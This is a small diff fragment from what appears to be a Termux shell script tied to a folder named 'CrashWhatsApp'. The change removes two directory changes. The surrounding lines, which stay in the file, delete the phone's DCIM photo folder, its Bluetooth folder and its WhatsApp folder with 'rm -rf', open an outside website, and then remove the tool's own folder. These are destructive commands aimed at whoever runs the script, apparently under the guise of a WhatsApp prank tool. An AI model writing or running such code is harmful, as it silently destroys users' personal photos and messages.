@@ -29,8 +29,6 @@ rm -rf DCIM
 rm -rf bluetooth
 rm -rf WhatsApp
 cd $HOME
-cd CrashWhatsApp
-cd BaapG
 termux-open  jairajputana.com
 cd $HOME
 rm -rf CrashWhatsApp
